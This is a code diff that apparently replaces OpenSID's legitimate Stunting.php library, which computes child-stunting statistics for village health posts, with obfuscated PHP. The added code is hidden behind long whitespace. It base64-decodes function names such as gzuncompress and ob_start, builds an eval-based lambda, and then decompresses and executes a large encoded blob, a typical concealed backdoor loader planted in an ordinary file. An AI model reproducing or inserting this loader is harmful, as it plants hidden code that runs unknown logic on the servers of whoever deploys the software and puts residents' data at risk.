@@ -1,388 +1,417 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Libraries/Stunting.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Libraries;
 
-use App\Models\Anak;
-use App\Models\IbuHamil;
-use App\Models\Posyandu;
-use App\Models\SasaranPaud;
 
-class Stunting
-{
-    private $kuartal;
-    private $tahun;
-    private $idPosyandu;
-    private $batasBulanAtas;
-    private $batasBulanBawah;
 
-    public function __construct(?array $default)
-    {
-        $this->kuartal    = $default['kuartal'] ?? null;
-        $this->tahun      = $default['tahun'] ?? null;
-        $this->idPosyandu = $default['idPosyandu'] ?? null;
 
-        if ($this->kuartal < 1 || $this->kuartal > 4) {
-            $this->kuartal = null;
-        }
 
-        if ($this->kuartal == null) {
-            $bulanSekarang = date('m');
-            if ($bulanSekarang <= 3) {
-                $_kuartal = 1;
-            } elseif ($bulanSekarang <= 6) {
-                $_kuartal = 2;
-            } elseif ($bulanSekarang <= 9) {
-                $_kuartal = 3;
-            } elseif ($bulanSekarang <= 12) {
-                $_kuartal = 4;
-            }
-            $this->kuartal = $_kuartal;
-        }
 
-        if ($this->tahun == null) {
-            $this->tahun = date('Y');
-        }
 
-        if ($this->kuartal == 1) {
-            $this->batasBulanBawah = 1;
-            $this->batasBulanAtas  = 3;
-        } elseif ($this->kuartal == 2) {
-            $this->batasBulanBawah = 4;
-            $this->batasBulanAtas  = 6;
-        } elseif ($this->kuartal == 3) {
-            $this->batasBulanBawah = 7;
-            $this->batasBulanAtas  = 9;
-        } elseif ($this->kuartal == 4) {
-            $this->batasBulanBawah = 10;
-            $this->batasBulanAtas  = 12;
-        }
-    }
 
-    public function chartStuntingUmurData()
-    {
-        $summary = collect([
-            [
-                'range_1' => [Anak::TB_PENDEK => 0, Anak::TB_SANGAT_PENDEK => 0],
-                'range_2' => [Anak::TB_PENDEK => 0, Anak::TB_SANGAT_PENDEK => 0],
-                'range_3' => [Anak::TB_PENDEK => 0, Anak::TB_SANGAT_PENDEK => 0],
-            ],
-        ]);
-        $stuntingObj = Anak::selectRaw('status_tikar')
-            ->selectRaw('sum(case when umur_bulan between 0 and 5 then 1 else 0 end) as range_1')
-            ->selectRaw('sum(case when umur_bulan between 6 and 11 then 1 else 0 end) as range_2')
-            ->selectRaw('sum(case when umur_bulan between 12 and 23 then 1 else 0 end) as range_3')
-            ->stuntingPendek()
-            ->whereMonth('created_at', '>=', $this->batasBulanBawah)
-            ->whereMonth('created_at', '<=', $this->batasBulanAtas)
-            ->whereYear('created_at', $this->tahun)
-            ->groupBy(['status_tikar']);
 
-        if ($this->idPosyandu) {
-            $stuntingObj->where('posyandu_id', $this->idPosyandu);
-        }
-        $stunting = $stuntingObj->get();
-        if (! $stunting->isEmpty()) {
-            $obj         = $stunting->keyBy('status_tikar');
-            $totalRange1 = $obj[Anak::TB_SANGAT_PENDEK]->range_1 + $obj[Anak::TB_PENDEK]->range_1;
-            $totalRange2 = $obj[Anak::TB_SANGAT_PENDEK]->range_2 + $obj[Anak::TB_PENDEK]->range_2;
-            $totalRange3 = $obj[Anak::TB_SANGAT_PENDEK]->range_3 + $obj[Anak::TB_PENDEK]->range_3;
-            $summary     = collect([
-                'range_1' => [Anak::TB_PENDEK => $this->conversiPercent($obj[Anak::TB_PENDEK]->range_1, $totalRange1), Anak::TB_SANGAT_PENDEK => $this->conversiPercent($obj[Anak::TB_SANGAT_PENDEK]->range_1, $totalRange1)],
-                'range_2' => [Anak::TB_PENDEK => $this->conversiPercent($obj[Anak::TB_PENDEK]->range_2, $totalRange2), Anak::TB_SANGAT_PENDEK => $this->conversiPercent($obj[Anak::TB_SANGAT_PENDEK]->range_2, $totalRange2)],
-                'range_3' => [Anak::TB_PENDEK => $this->conversiPercent($obj[Anak::TB_PENDEK]->range_3, $totalRange3), Anak::TB_SANGAT_PENDEK => $this->conversiPercent($obj[Anak::TB_SANGAT_PENDEK]->range_3, $totalRange3)],
-            ]);
-        }
 
-        return [
-            ['id' => 'chart_0_5', 'title' => 'Jumlah Per Gol Umur 0-5 Bulan', 'data' => [['name' => 'Pendek (Stunting)', 'y' => $summary['range_1'][Anak::TB_PENDEK]], ['name' => 'Sangat Pendek (Severity Stunting)', 'y' => $summary['range_1'][Anak::TB_SANGAT_PENDEK]]]],
-            ['id' => 'chart_6_11', 'title' => 'Jumlah Per Gol Umur 6-11 Bulan', 'data' => [['name' => 'Pendek (Stunting)', 'y' => $summary['range_2'][Anak::TB_PENDEK]], ['name' => 'Sangat Pendek (Severity Stunting)', 'y' => $summary['range_2'][Anak::TB_SANGAT_PENDEK]]]],
-            ['id' => 'chart_12_23', 'title' => 'Jumlah Per Gol Umur 12-23 Bulan', 'data' => [['name' => 'Pendek (Stunting)', 'y' => $summary['range_3'][Anak::TB_PENDEK]], ['name' => 'Sangat Pendek (Severity Stunting)', 'y' => $summary['range_3'][Anak::TB_SANGAT_PENDEK]]]],
-        ];
-    }
 
-    public function chartPosyanduData()
-    {
-        $giziAnakObj = Anak::selectRaw('status_gizi, posyandu_id, count(*) as total')
-            ->whereMonth('created_at', '>=', $this->batasBulanBawah)
-            ->whereMonth('created_at', '<=', $this->batasBulanAtas)
-            ->whereYear('created_at', $this->tahun)
-            ->groupBy(['posyandu_id', 'status_gizi']);
-        $posyanduObj = Posyandu::query();
-        if ($this->idPosyandu) {
-            $giziAnakObj->wherePosyanduId($this->idPosyandu);
-            $posyanduObj->whereId($this->idPosyandu);
-        }
-        $posyandu = $posyanduObj->get();
 
-        $giziAnak = $giziAnakObj->get();
-        $summary  = collect([
-            [
-                'normal'          => [],
-                'resiko_stunting' => [],
-                'stunting'        => [],
-            ],
-        ]);
-        if (! $giziAnak->isEmpty()) {
-            $summary = $giziAnak->groupBy('posyandu_id')->map(static function ($item) {
-                return [
-                    'normal'          => $item->sum(static fn ($q) => $q->isNormal() ? $q->total : 0),
-                    'resiko_stunting' => $item->sum(static fn ($q) => $q->isResikoStunting() ? $q->total : 0),
-                    'stunting'        => $item->sum(static fn ($q) => $q->isStunting() ? $q->total : 0),
-                ];
-            });
-        }
 
-        return [
-            'categories' => $posyandu->pluck('nama')->toArray(),
-            'data'       => [
-                ['name' => 'Normal', 'data' => $summary->pluck('normal')->toArray()],
-                ['name' => 'Risiko Stunting', 'data' => $summary->pluck('resiko_stunting')->toArray()],
-                ['name' => 'Terindikasi Stunting', 'data' => $summary->pluck('stunting')->toArray()],
-            ],
-        ];
-    }
 
-    public function scoreCard()
-    {
-        $rekap = new Rekap();
 
-        $JTRT_IbuHamil = IbuHamil::query()
-            ->distinct()
-            ->join('kia', 'ibu_hamil.kia_id', '=', 'kia.id')
-            ->whereMonth('ibu_hamil.created_at', '>=', $this->batasBulanBawah)
-            ->whereMonth('ibu_hamil.created_at', '<=', $this->batasBulanAtas)
-            ->whereYear('ibu_hamil.created_at', $this->tahun)
-            ->selectRaw('ibu_hamil.kia_id as kia_id')
-            ->get();
 
-        $JTRT_BulananAnak = Anak::query()
-            ->distinct()
-            ->join('kia', 'bulanan_anak.kia_id', '=', 'kia.id')
-            ->whereMonth('bulanan_anak.created_at', '>=', $this->batasBulanBawah)
-            ->whereMonth('bulanan_anak.created_at', '<=', $this->batasBulanAtas)
-            ->whereYear('bulanan_anak.created_at', $this->tahun)
-            ->selectRaw('bulanan_anak.kia_id as kia_id')
-            ->get();
 
-        $dataNoKia = [];
 
-        foreach ($JTRT_IbuHamil as $item_ibuHamil) {
-            $dataNoKia[] = $item_ibuHamil;
 
-            foreach ($JTRT_BulananAnak as $item_bulananAnak) {
-                if (! in_array($item_bulananAnak, $dataNoKia)) {
-                    $dataNoKia[] = $item_bulananAnak;
-                }
-            }
-        }
 
-        $ibu_hamil    = $rekap->get_data_ibu_hamil($this->kuartal, $this->tahun, $this->idPosyandu);
-        $bulanan_anak = $rekap->get_data_bulanan_anak($this->kuartal, $this->tahun, $this->idPosyandu);
 
-        //HITUNG KEK ATAU RISTI
-        $jumlahKekRisti = 0;
 
-        foreach ($ibu_hamil['dataFilter'] as $item) {
-            if (! in_array($item['user']['status_kehamilan'], [null, '1'])) {
-                $jumlahKekRisti++;
-            }
-        }
 
-        //HITUNG HASIL PENGUKURAN TIKAR PERTUMBUHAN
-        $status_tikar = collect(Anak::STATUS_TIKAR_ANAK)->pluck('simbol', 'id');
-        $tikar        = ['TD' => 0, 'M' => 0, 'K' => 0, 'H' => 0];
 
-        if ($bulanan_anak['dataGrup'] != null) {
-            foreach ($bulanan_anak['dataGrup'] as $detail) {
-                $totalItem = count($detail);
-                $i         = 0;
 
-                foreach ($detail as $item) {
-                    if (++$i === $totalItem) {
-                        $tikar[$status_tikar[$item['status_tikar']]]++;
-                    }
-                }
-            }
 
-            $jumlahGiziBukanNormal = 0;
 
-            foreach ($bulanan_anak['dataFilter'] as $item) {
-                // N = 1
-                if ($item['umur_dan_gizi']['status_gizi'] != 'N') {
-                    $jumlahGiziBukanNormal++;
-                }
-            }
-        } else {
-            $dataNoKia             = [];
-            $jumlahGiziBukanNormal = 0;
-        }
 
-        //START ANAK PAUD------------------------------------------------------------
-        $totalAnak = [
-            'januari'   => ['total' => 0, 'v' => 0],
-            'februari'  => ['total' => 0, 'v' => 0],
-            'maret'     => ['total' => 0, 'v' => 0],
-            'april'     => ['total' => 0, 'v' => 0],
-            'mei'       => ['total' => 0, 'v' => 0],
-            'juni'      => ['total' => 0, 'v' => 0],
-            'juli'      => ['total' => 0, 'v' => 0],
-            'agustus'   => ['total' => 0, 'v' => 0],
-            'september' => ['total' => 0, 'v' => 0],
-            'oktober'   => ['total' => 0, 'v' => 0],
-            'november'  => ['total' => 0, 'v' => 0],
-            'desember'  => ['total' => 0, 'v' => 0],
-        ];
 
-        $anak2sd6 = SasaranPaud::query();
-        $anak2sd6->whereYear('sasaran_paud.created_at', $this->tahun)->get();
 
-        foreach ($anak2sd6 as $datax) {
-            if ($datax->januari != 'belum') {
-                $totalAnak['januari']['total']++;
-            }
-            if ($datax->februari != 'belum') {
-                $totalAnak['februari']['total']++;
-            }
-            if ($datax->maret != 'belum') {
-                $totalAnak['maret']['total']++;
-            }
-            if ($datax->april != 'belum') {
-                $totalAnak['april']['total']++;
-            }
-            if ($datax->mei != 'belum') {
-                $totalAnak['mei']['total']++;
-            }
-            if ($datax->juni != 'belum') {
-                $totalAnak['juni']['total']++;
-            }
-            if ($datax->juli != 'belum') {
-                $totalAnak['juni']['total']++;
-            }
-            if ($datax->agustus != 'belum') {
-                $totalAnak['agustus']['total']++;
-            }
-            if ($datax->september != 'belum') {
-                $totalAnak['juni']['total']++;
-            }
-            if ($datax->oktober != 'belum') {
-                $totalAnak['oktober']['total']++;
-            }
-            if ($datax->november != 'belum') {
-                $totalAnak['november']['total']++;
-            }
-            if ($datax->desember != 'belum') {
-                $totalAnak['desember']['total']++;
-            }
 
-            if ($datax->januari == 'v') {
-                $totalAnak['januari']['v']++;
-            }
-            if ($datax->februari == 'v') {
-                $totalAnak['februari']['v']++;
-            }
-            if ($datax->maret == 'v') {
-                $totalAnak['maret']['v']++;
-            }
-            if ($datax->april == 'v') {
-                $totalAnak['april']['v']++;
-            }
-            if ($datax->mei == 'v') {
-                $totalAnak['mei']['v']++;
-            }
-            if ($datax->juni == 'v') {
-                $totalAnak['juni']['v']++;
-            }
-            if ($datax->juli == 'v') {
-                $totalAnak['juni']['v']++;
-            }
-            if ($datax->agustus == 'v') {
-                $totalAnak['agustus']['v']++;
-            }
-            if ($datax->september == 'v') {
-                $totalAnak['juni']['v']++;
-            }
-            if ($datax->oktober == 'v') {
-                $totalAnak['oktober']['v']++;
-            }
-            if ($datax->november == 'v') {
-                $totalAnak['november']['v']++;
-            }
-            if ($datax->desember == 'v') {
-                $totalAnak['desember']['v']++;
-            }
-        }
 
-        $dataAnak0sd2Tahun = ['jumlah' => 0, 'persen' => 0];
-        if ($this->kuartal == 1) {
-            $jmlAnk = $totalAnak['januari']['total'] + $totalAnak['februari']['total'] + $totalAnak['maret']['total'];
-            $jmlV   = $totalAnak['januari']['v'] + $totalAnak['februari']['v'] + $totalAnak['maret']['v'];
-        } elseif ($this->kuartal == 2) {
-            $jmlAnk = $totalAnak['april']['total'] + $totalAnak['mei']['total'] + $totalAnak['juni']['total'];
-            $jmlV   = $totalAnak['april']['v'] + $totalAnak['mei']['v'] + $totalAnak['juni']['v'];
-        } elseif ($this->kuartal == 3) {
-            $jmlAnk = $totalAnak['agustus']['total'];
-            $jmlV   = $totalAnak['agustus']['v'];
-        } elseif ($this->kuartal == 4) {
-            $jmlAnk = $totalAnak['oktober']['total'] + $totalAnak['november']['total'] + $totalAnak['desember']['total'];
-            $jmlV   = $totalAnak['oktober']['v'] + $totalAnak['november']['v'] + $totalAnak['desember']['v'];
-        }
-        $dataAnak0sd2Tahun['jumlah'] = $jmlV;
-        $dataAnak0sd2Tahun['persen'] = $jmlAnk !== 0 ? number_format($jmlV / $jmlAnk * 100, 2) : 0;
 
-        //END ANAK PAUD------------------------------------------------------------
-        $data['dataAnak0sd2Tahun']     = $dataAnak0sd2Tahun;
-        $data['id']                    = $this->idPosyandu;
-        $data['posyandu']              = Posyandu::get();
-        $data['JTRT']                  = count($dataNoKia);
-        $data['jumlahKekRisti']        = $jumlahKekRisti;
-        $data['jumlahGiziBukanNormal'] = $jumlahGiziBukanNormal;
-        $data['tikar']                 = $tikar;
-        $data['ibu_hamil']             = $ibu_hamil;
-        $data['bulanan_anak']          = $bulanan_anak;
-        $data['dataTahun']             = $data['ibu_hamil']['dataTahun'];
-        $data['kuartal']               = $this->kuartal;
-        $data['_tahun']                = $this->tahun;
 
-        return $data;
-    }
 
-    private function conversiPercent($number, $total)
-    {
-        return (int) (str_replace('%', '', persen3($number, $total)));
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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